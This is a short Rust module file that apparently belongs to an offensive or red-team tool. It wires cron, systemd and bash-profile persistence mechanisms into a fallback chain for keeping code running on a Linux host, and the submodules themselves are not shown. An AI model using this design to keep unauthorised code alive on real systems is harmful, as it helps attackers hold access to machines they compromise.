use crate::persistence::PersistenceChain;

pub mod bash_profile;
pub mod cron;
pub mod systemd;

pub fn get_chain() -> PersistenceChain {
    PersistenceChain::new(vec![
        Box::new(cron::CronPersistence),
        Box::new(systemd::SystemdPersistence),
        Box::new(bash_profile::BashProfilePersistence),
    ])
}
